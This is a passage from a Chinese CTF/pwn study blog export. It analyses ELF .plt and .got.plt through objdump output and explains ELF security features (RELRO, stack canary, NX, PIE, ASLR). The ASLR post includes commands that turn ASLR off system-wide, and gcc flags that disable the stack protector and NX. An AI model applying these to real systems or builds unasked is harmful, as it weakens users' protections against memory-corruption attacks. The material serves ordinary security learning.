<p>我们看到如下的代码:</p>
<p><img src="/image/post/transship/0005/2.jpg" alt=".PLT项的内容分析"></p>
<center>.PLT项的内容分析</center>

<p>结论:</p>
<ul>
<li>PLT 实际为代码段. 不是简单的数据段. 首先其内容不会变. 且内容的确为一些JMP相关的代码。</li>
<li>PLT的第一项地址为: 0x0000030C (这个是基于VMA基地址为0的虚拟地址)</li>
<li>上面的ebx的值实际为<code>.got.plt</code>段的基地址.(后面会证明)</li>
<li>使用<code>.got.plt</code>表进行间接寻址时,是从第4项开始的,即前三项进行了跳过。</li>
<li><code>.got.plt</code> 表项的大小为 <code>4字节</code></li>
<li><code>addtwo</code> 作为一个内部和外部都会调用的函数.在PLT中有自己的<strong>表项</strong>。</li>
<li><strong>注意：</strong> 而同时也作为外部函数的addthree 并<strong>没有自己的PLT项</strong>。</li>
</ul>
<h3 id="验证-ebx的内容是-got-plt基地址"><a href="#验证-ebx的内容是-got-plt基地址" class="headerlink" title="验证 ebx的内容是.got.plt基地址"></a>验证 ebx的内容是<code>.got.plt</code>基地址</h3><p>我 们先看一下<code>.got</code>的段信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令: objdump -j .got -h add.so</span><br><span class="line">add.so:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"> 18 .got          0000000c  000015a8  000015a8  000005a8  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure>
<p>我们发现<code>.got</code>段的大小为<code>12</code>字节. 偏移地址为：<code>0x000015a8</code>，紧接着我们看一下<code>.got.plt</code>的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令 objdump -j .got.plt  -h add.so</span><br><span class="line"></span><br><span class="line">add.so:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"> 19 .got.plt      00000018  000015b4  000015b4  000005b4  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure>
<p><strong>重点：</strong> <code>.got.plt</code>的VMA是：<code>0x000015b4</code>；这个好像并不能说明什么。别急，我们看一下ebx的内容是怎么得到的，先看一下<code>addthree</code>中对<code>addtwo</code>的调用部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000040c &lt;addtwo&gt;:</span><br><span class="line"> 40c:	55                   	push   %ebp</span><br><span class="line"> 40d:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 40f:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 412:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)</span><br><span class="line"> 419:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 41c:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 41f:	8d 04 02             	lea    (%edx,%eax,1),%eax</span><br><span class="line"> 422:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 425:	8b 45 fc             	mov    -0x4(%ebp),%eax</span><br><span class="line"> 428:	c9                   	leave</span><br><span class="line"> 429:	c3                   	ret</span><br><span class="line"></span><br><span class="line">0000042a &lt;addthree&gt;:</span><br><span class="line"> 42a:	55                   	push   %ebp</span><br><span class="line"> 42b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 42d:	53                   	push   %ebx</span><br><span class="line"> 42e:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line">;====:</span><br><span class="line"> 431:	e8 d1 ff ff ff       	call   407 &lt;__i686.get_pc_thunk.bx&gt; ;</span><br><span class="line"> 436:	81 c3 7e 11 00 00    	add    $0x117e,%ebx</span><br><span class="line"> 43c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)</span><br><span class="line"> 443:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 446:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 44a:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 44d:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 450:	e8 d7 fe ff ff       	call   32c &lt;addtwo@plt&gt;</span><br><span class="line"> 455:	03 45 10             	add    0x10(%ebp),%eax</span><br><span class="line"> 458:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 45b:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 45e:	83 c4 24             	add    $0x24,%esp</span><br><span class="line"> 461:	5b                   	pop    %ebx</span><br><span class="line"> 462:	5d                   	pop    %ebp</span><br><span class="line"> 463:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>我们对计算的部分进行一下标注：</p>
<p><img src="/image/post/transship/0005/3.jpg" alt=""></p>
<center>在call addtwo@plt之前.ebx的值已经计算好为: 0x15B4</center>

<ul>
<li>与预期一致，因为这个库里面的所有的代码都是需要重定位的，没有静态可以确定位置的。</li>
</ul>
<p>再看一下动态段的重定位表：</p>
<p><img src="/image/post/transship/0005/4.jpg" alt=""></p>
<center>另外一个引用PLT表的地方：EBX仍然值为0x15B4</center>

<p>因此我们可以确定，当所有的调用到<code>.plt</code>段的时候，ebx都会提前初始化为<code>.got.plt</code>的段基地址。而在上面的PLT的表项中的代码中，在引用EBX进行JMP的时候，还会跟上一个表内偏移。</p>
<ul>
<li>第一个PLT项是一个common的项。没有用于跳转找目标函数。</li>
<li>从第二个PLT项开始安排为跳转项。每一个PLT项的大小为：16字节。因为每个表项之间的偏移为16字节。</li>
<li>PLT引用的<code>.got.plt</code>段前三个entry都没有用到. 根据书中的内容我们可知：</li>
</ul>
<p><img src="/image/post/transship/0005/5.jpg" alt=""></p>
<center>.got.plt中的前三项内容</center>

<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>我们看一下重定位表的内容，按道理重定位表应该会对<code>.got</code>和<code>.got.plt</code>的内容进行重定位，因为动态链接库的装载地址是不确定的。因此<code>.got</code>项和<code>.got.plt</code>的内容都需要在装载时重定位。</p>
<p>先看一下非动态段的重定位表：</p>
<p><img src="/image/post/transship/0005/6.jpg" alt=""></p>
<center>没有需要重定位的的项</center>

<ul>
<li>与预期一致，因为这个库里面的所有的代码都是需要重定位的。没有静态可以确定位置的。</li>
</ul>
<p>再看一下动态段的重定位表：</p>
<p><img src="/image/post/transship/0005/7.jpg" alt=""></p>
<center>一样与预期一致</center>

<p>解读一下：</p>
<ul>
<li>同样没有函数: <code>addthree</code> 的符号的相关的重定位项. (并不代表<code>addthree</code>不需要重定位. 这是两个概念.)</li>
<li>里面有三个<code>R_386_JUMP_SLOT</code>类型的重定位项. 三个项的地址分别是:<ul>
<li>000015c0: <code>R_386_JUMP_SLOT</code></li>
<li>000015c4: <code>R_386_JUMP_SLOT</code></li>
<li>000015c8: <code>R_386_JUMP_SLOT</code></li>
</ul>
</li>
</ul>
<p>我们知道<code>.got.plt</code>的首地址是: <code>0x15B4</code>。而第一个<code>JUMP_SLOT</code>的地址是：<code>15B4+4*3</code> = <code>15C0</code> 和前面分析的跳过了前三项<code>got.plt</code>项保持一致。</p>
<h3 id="为什么没有addthree的plt项"><a href="#为什么没有addthree的plt项" class="headerlink" title="为什么没有addthree的plt项"></a>为什么没有<code>addthree</code>的<code>plt</code>项</h3><ul>
<li>这个问题其实非常重要。它将揭示<code>.plt</code>表项的本质。以及结合上面的PLT项是代码还是数据结合看就可以得出结论了。</li>
</ul>
<p>虽然我们的动态链接库同时导出了两个函数：<code>addtwo</code>和<code>addthree</code>；但是并不是两个函数都出现在了<code>.plt</code>中。而且只有一个被内部自己调用的<code>addtwo</code>函数有一个<code>.plt</code>表项. 这似乎隐约在说明一个问题：</p>
<ul>
<li><code>.plt</code>段是一个胶水代码段，他属于调用方，不属于被调用方。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">上面猜测是属于调用方，那似乎应该大概在main函数的主模块里面会有对应的```.plt```段，并且有相应的```addtwo```函数和```addthree```函数的入口，我们先来看一下：</span><br><span class="line"></span><br><span class="line">### ```main```模块中的```got.plt```</span><br><span class="line"></span><br><span class="line">下面是主模块中的```.plt```段，果不其然，我们在其中发现了两个```.plt```项：</span><br><span class="line"></span><br><span class="line">* ```addtwo@plt``` : ```0x08048400```</span><br><span class="line">* ```addthree@plt``` ```0x08048410```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 由于在主程序模块中，不需要动态重定位，因此这些代码加载到内存虚拟空间的地址是确定的。</span><br><span class="line"></span><br><span class="line">![](/image/post/transship/0005/8.jpg)</span><br><span class="line">&lt;center&gt;主程序模块中的.plt段&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">这样就可以进一步的确认：```.plt```模块是属于调用方，因为我们在调用方的代码中找到了两个动态模块中的函数的```.plt```入口，而在动态模块中并没有完整的两个入口。</span><br><span class="line"></span><br><span class="line">* 这其实与之前理解的plt可能属于数据段，然后由于延时加载的需要在```.got```的基础上，又加了一级```.plt```的**间接跳转**。这样这个```.plt```因为作用与```.got```类似。```.got```是一个全局偏移表，那似乎可以被所有的模块共用(现在还不能确定，后面会论证)。那```.plt```也一样，就像把一级指针的```.got```变成了两级指针的```.plt```加```.got```了。这个理解似乎没有什么问题，如果```.plt```是数据段的话。只是又加了一级对```.got```的间接寻址而已。如果```.plt```是全局共享的话，那其它模块在引用它的时候。需要：</span><br><span class="line">  - 要么绝对寻址地从一个地方call调用跳转到相应的```.plt```的地方。由于是绝对地址，而```.plt```有加载地址是不确定的。是动态的。那只有**加载时重定位**   的方式才能实现。那这个方式就决定了只有主模块在使用加载时重定位的方式进行修改地址。但是这个只能主模块适用。如果是其它的模块。比如另外的动态模块，那动态模块就必须得修改代码段才能正确引用到```.plt```的地址，这样就无法实现PIC的代码了，**因此结论不成立**。</span><br><span class="line">  - 如果是使用相对寻址。那就需要相对寻址的两者之间的地址不能变化。否则就不能相对寻址了。那这样其它模块与 这个动态模块的地址之间就产生了关联。违背了**动态模块地址无关性**的PIC模式。因此**结论也不成立**。</span><br><span class="line"></span><br><span class="line">这样：不管使用怎样的地址定位方式，其它模块都无法友好的使用当前动态模块的```.plt```入口，因此，```.plt```必不属于被调用方，它应该是调用方自己的一个附属的胶水代码。</span><br><span class="line"></span><br><span class="line">## ```.got.plt```段是否为进程全局唯一共享</span><br><span class="line"></span><br><span class="line">这样我们论证完```.plt```的归属后，接下来的问题就是确定```.got```段的唯一性与归属性的问题。</span><br><span class="line">* 先说一个引子：</span><br><span class="line">  - 问：我们最初成立```.got```段的目的是什么？</span><br><span class="line">  - 答：把代码中引用一个不确定的地址的情况下，需要重定位修改代码部分的重定位过程导致代码段不可变不成立的：地址引用，将其从代码中剥离出来。单独放到数据段。就像代码段中对一个变量的绝对地址引用，修改为从数据段的一个地址指针的间接引用，这样才能保证代码段的内容始终保持不变。然后数据段```.GOT```的内容动态的重定位到相应的目标符号。</span><br><span class="line"></span><br><span class="line">其实有了上面一段描述的推理后，那```.got```是否属于进程中所有共享对象统一使用。这个结论已经很明确了。那就是```.got```段是属于模块自身的一个数据段，而不是所有的模块共享，从上面的```.got```段会被一个代码段的地址相对地址引用，那就决定了```.got```必须与相对应的代码段保持稳定的相对距离，这样才能被代码用相对地址定位的方式进行访问到。而另外一方面，不同的代码段之间的相对位置又是不确定的。这就间接说明了，不同共享对象的之间的代码段的相对地址不确定，所以不同的代码段(不同的模块)之间使用的```.got```不是同一个表。虽然```.got```被称作```全局偏移表：global offset table```，但是他只属于模块本身。</span><br><span class="line"></span><br><span class="line">### main中的```.got.plt```地址：</span><br><span class="line"></span><br><span class="line">同样先看一下```.got```</span><br><span class="line"></span><br><span class="line">![](/image/post/transship/0005/9.jpg)</span><br><span class="line">&lt;center&gt;main模块中的.got段的信息&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">我们可以看到的确在main模块中有```.got```段且其虚拟地址在这里已经确定下来：```080497c4```，这个与动态模块中的```.got```段的虚拟地址不一样，其虚拟地址为：```000015a8```，这两个的地址完全不一样。</span><br><span class="line"></span><br><span class="line">再看一下我们的目标：```.got.plt```</span><br><span class="line"></span><br><span class="line">![](/image/post/transship/0005/10.jpg)</span><br><span class="line">&lt;center&gt;main模块中的.got.plt&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">同样我们看一下main中对```.got.plt```的引用有一些不一样：</span><br><span class="line"></span><br><span class="line">```asm</span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080483d0 &lt;__gmon_start__@plt-0x10&gt;:</span><br><span class="line"> 80483d0:	ff 35 cc 97 04 08    	pushl  0x80497cc</span><br><span class="line"> 80483d6:	ff 25 d0 97 04 08    	jmp    *0x80497d0</span><br><span class="line"> 80483dc:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">080483e0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80483e0:	ff 25 d4 97 04 08    	jmp    *0x80497d4</span><br><span class="line"> 80483e6:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 80483eb:	e9 e0 ff ff ff       	jmp    80483d0 &lt;_init+0x30&gt;</span><br></pre></td></tr></table></figure>
<p>我们发现：</p>
<ol>
<li>在main中对<code>.got.plt</code>的引用不再使用ebx寄存器进行基址相对寻址。</li>
<li>使用的第一个<code>.got.plt</code>项是<code>0x80497d4</code>。</li>
</ol>
<p>而我们上面说<code>.got.plt</code>的基地址是：<code>080497c8</code>，那前三项是被跳过了的即：<code>080497c8</code>,<code>080497cc</code>,<code>080497d0</code>，然后从<code>0x80497d4</code>开始，与前面所说的跳过前三项用于加载当前模块的动态依赖相关的信息有关系。</p>
<p>到此。所有的疑问都很清晰了，还有一点需要我们探究一下。那就是为什么main模块中对<code>.got.plt</code>引用不是使用的ebx进行寻址。而<code>add.so</code>中却是如此，其实啊，这个与两个模块的虚拟地址的确定与否有关系。</p>
<ul>
<li>主模块的加载虚拟地址是确定的。它是加载到进程中的第一个模块。他的地址在编译链接时就已经确认。在加载到内存的时候直接按照<code>program header</code>的信息加载到内存即可。因此：模块代码与got相关的位置是固定的，且是确定的。那在进行寻址的时候，直接使用一个固定的地址的间接引用即可。(即上面的:<code>jmp *0x80497d0</code>)</li>
<li>而动态模块在加载的时候其加载基地址是不确定的，因此需要使用ebx去动态的获取到当前代码加载的地址。这样才能够满足动态加载的需求。</li>
</ul>
<p>最后总结一下：plt是属于调用方的一段胶水代码。有多少个模块就可能存在多少个<code>.plt</code>段，而这个<code>.plt</code>段还是单独为这一个模块服务的。比如模块a调用了模块b。那a中就会有一个单独的<code>.plt</code>属于模块a用来间接寻址模块b。且这个<code>.plt</code>段会一个配套的<code>.got.plt</code>段来存储最后的真正的地址。那如果还有一个模块c也调用了模块b。那c需要一个自己的``.plt<code>和</code>.got.plt```来完成相同的工作。</p>
<p>由于有全局符号介入的机制的存在，即使是自己调用自己，那也需要在自己的模块里面生成一段<code>.plt</code>代码和相应的<code>.got.plt</code>入口来完成对自己的代码的“相对寻址”，虽然明明知道自己要调用的代码与自己的相对位置是多少。但是我们就是偏偏不能那样做。因为由于全局符号介入的关系，我们最终调用的符号自己，可能不真的我们自己。</p>
<p>下面我画了一个图来总结呈现下这个关系吧，以防止你和我一样被绕晕：</p>
<p><img src="/image/post/transship/0005/1.jpg" alt=""></p>
<center>不同模块之间的.plt和.got.plt 之间的关系</center>

<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>最后我们还是以问题结束吧：</p>
<ul>
<li>动态库中的PLT表与主程序中的PLT表是否为同一份？<ul>
<li>答：不是同一份</li>
</ul>
</li>
<li>动态库中的GOT.PLT表与主程序中的GOT.PLT表是否为同一份？<ul>
<li>答：同样不是同一份</li>
</ul>
</li>
<li>PLT表是代码还是数据？<ul>
<li>这个是代码，不是数据。虽然&lt;自我修养&gt;中说是一个个的项</li>
</ul>
</li>
<li>动态库内部函数之间的调用为何不直接使用相对地址调用？<ul>
<li>因为有全局符号介入的存在.导致实际调用有可能不是调用自己的函数的情况。<br>上面并没有论证<code>.got</code>是否为同一个，看完上面的内容，或许你已经有了答案。</li>
</ul>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.zhihu.com/question/21249496">Linux动态链接为什么要用PLT和GOT表？</a><br>[2] <a href="https://blog.werner.wiki/elf-plt-got-static-analysis/">ELF 文件 PLT 和 GOT 静态分析</a></p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn 知识点汇总</title>
    <url>/2024/11/14/ctfpwn/pwn-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇只给出原博客地址，方便review而已。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="重要工具"><a href="#重要工具" class="headerlink" title="重要工具"></a>重要工具</h2><ul>
<li><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B71-pwntools%E6%A8%A1%E5%9D%97/" title="pwn工具1 pwntools模块">pwntools</a>
</li>
</ul>
<h2 id="计算机指令系统"><a href="#计算机指令系统" class="headerlink" title="计算机指令系统"></a>计算机指令系统</h2><h3 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h3><p>作者：<a href="https://www.zhihu.com/people/chen-hao-dong-34-27">鸫鸫鹅</a>：<a href="https://zhuanlan.zhihu.com/p/370204019">关于寻址方式一篇就够了</a></p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="plt表与got表及elf的安全属性"><a href="#plt表与got表及elf的安全属性" class="headerlink" title="plt表与got表及elf的安全属性"></a>plt表与got表及elf的安全属性</h4><ul>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0001-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A81/" title="转载0001 plt表和got表1">转载0001-plt表和got表1</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0002-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A82/" title="转载0002 plt表和got表2">转载0002-plt表和got表2</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0003-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A83/" title="转载0003 plt表和got表3">转载0003-plt表和got表3</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0004-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A84/" title="转载0004 plt表和got表4">转载0004-plt表和got表4</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0005-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A85/" title="转载0005 plt表和got表5">转载0005-plt表和got表5</a></li>
<li><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B91-elf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/" title="pwn知识点1 elf的安全属性">elf的安全属性</a>
</li>
</ul>
<h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><ul>
<li><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/" title="pwn知识点2 ASLR,PIE和PIC的异同">ASLR、PIE和PIC的异同</a>
</li>
</ul>
<h4 id="函数调用与栈基本知识"><a href="#函数调用与栈基本知识" class="headerlink" title="函数调用与栈基本知识"></a>函数调用与栈基本知识</h4><p>作者：<a href="https://www.zhihu.com/people/Jwizard">Jwizard</a>：<a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">自己做ctfshow上ret2libc题的WP</a>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn知识点1 elf的安全属性</title>
    <url>/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B91-elf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="elf的安全属性"><a href="#elf的安全属性" class="headerlink" title="elf的安全属性"></a>elf的安全属性</h2><h3 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h3><p>指的是编译环境或是编译器环境之类的。</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><h4 id="RELRO介绍"><a href="#RELRO介绍" class="headerlink" title="RELRO介绍"></a>RELRO介绍</h4><p>表示对是否有对数据区域的读写进行限制。</p>
<p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。</p>
<p><strong>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对<code>GOT(Global Offset Table)</code>攻击。</strong>（具体看RELRO类型）</p>
<h4 id="RELRO类型"><a href="#RELRO类型" class="headerlink" title="RELRO类型"></a>RELRO类型</h4><p>类型有三种：</p>
<ol>
<li><code>Full RELRO</code> 完全开启只读保护，意味着<code>.plt</code>和<code>.got.plt</code>均为只读</li>
<li><code>Partial RELRO</code> 部分开启只读保护，意味着<code>plt</code>只读，<code>.got.plt</code>可写</li>
<li><code>No RELRO</code> 关闭只读保护，意味着<code>.plt</code>和<code>.got.plt</code>均可写。</li>
</ol>
<h4 id="gcc编译时关于RELRO的控制"><a href="#gcc编译时关于RELRO的控制" class="headerlink" title="gcc编译时关于RELRO的控制"></a>gcc编译时关于RELRO的控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，看环境</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，即</span><br></pre></td></tr></table></figure>
<h3 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h3><h4 id="Stack-Canary功能介绍和原理解释"><a href="#Stack-Canary功能介绍和原理解释" class="headerlink" title="Stack Canary功能介绍和原理解释"></a>Stack Canary功能介绍和原理解释</h4><p>表示栈保护功能有没有开启。</p>
<ul>
<li>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。</li>
<li>当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</li>
<li>在Linux中我们将cookie信息称为canary。</li>
</ul>
<h4 id="gcc编译时关于canary功能的控制"><a href="#gcc编译时关于canary功能的控制" class="headerlink" title="gcc编译时关于canary功能的控制"></a>gcc编译时关于canary功能的控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                           //默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c      //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c         //启用堆栈保护，不过只为局部变量中含有char数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c     //启用堆栈保护，为所有函数插入保护代码，只有这种情况checksec才会显示canaryfound</span><br></pre></td></tr></table></figure>
<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><h4 id="NX介绍"><a href="#NX介绍" class="headerlink" title="NX介绍"></a>NX介绍</h4><p>表示是否对内存有进行保护。</p>
<p>个人理解即：<strong>数据段禁止执行</strong></p>
<p>linux上叫NX，windows上类似的叫DEP。</p>
<ul>
<li>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行。</li>
<li>当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</li>
</ul>
<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p>
<h4 id="gcc编译时关于NX的控制"><a href="#gcc编译时关于NX的控制" class="headerlink" title="gcc编译时关于NX的控制"></a>gcc编译时关于NX的控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c                        // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c           // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c         // 开启NX保护</span><br></pre></td></tr></table></figure>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>先说明：<strong>PIE和ASLR不是一个东西</strong>。</p>
<p>且看这一篇吧：<a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/" title="pwn知识点2 ASLR,PIE和PIC的异同">ASLR,PIE和PIC的异同</a></p>
<h3 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h3><p>可以在编译时指定程序运行时动态链接库的搜寻路径，防止将一些动态库恶意替换，以达到攻击目的。</p>
<h3 id="Debuginfo"><a href="#Debuginfo" class="headerlink" title="Debuginfo"></a>Debuginfo</h3><p>使用<code>gcc</code>带<code>-g</code>调试选项编译的程序留有用于调试的一些记录，这样的程序会被checksec检测为：<code>Debuginfo: Yes</code>。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn知识点2 ASLR,PIE和PIC的异同</title>
    <url>/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/</url>
    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h3 id="ASLR介绍"><a href="#ASLR介绍" class="headerlink" title="ASLR介绍"></a>ASLR介绍</h3><p>进程地址空间各区域随机化，ASLR(Address Space Layout Randomization)。</p>
<p>这是系统级的设置，可以在系统层面全部调整。</p>
<ul>
<li>为了提升系统的安全，增大漏洞的攻击难度，提出了，称之为ASLR(Address Space Layout Randomization)。</li>
<li>ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。</li>
<li><strong>它是在程序运行时系统进行的操作，因而只能随机化stack、heap、libraries的基址</strong>。</li>
<li>现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。</li>
</ul>
<h4 id="PIE类型-级别（ASLR保护参数值）"><a href="#PIE类型-级别（ASLR保护参数值）" class="headerlink" title="PIE类型/级别（ASLR保护参数值）"></a>PIE类型/级别（ASLR保护参数值）</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0: ASLR 关闭</span><br><span class="line">1: 随机化栈基地址（stack）、共享库（.so\libraries）、mmap基地址</span><br><span class="line">2: 在1基础上，增加随机化堆基地址（chunk）</span><br></pre></td></tr></table></figure>
<p>来自<a href="https://blog.csdn.net/weixin_43921239/article/details/103813046">博客(csdn)</a></p>
<h4 id="Linux系统设置ASLR"><a href="#Linux系统设置ASLR" class="headerlink" title="Linux系统设置ASLR"></a>Linux系统设置ASLR</h4><ul>
<li>ASLR存储在<code>/proc/sys/kernel/randomize_va_space</code></li>
</ul>
<p>注意：下面<code>echo 0</code>也可以换成<code>echo 1</code>或者<code>echo 2</code>。</p>
<p>Root用户：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
<ul>
<li>注意：非root用户如下设置会报错。因为这样写系统会认为是sudo 命令重定向，而sudo命令不支持重定向。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">bash: /proc/sys/kernel/randomize_va_space: Permission denied</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>正确写法：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure></p>
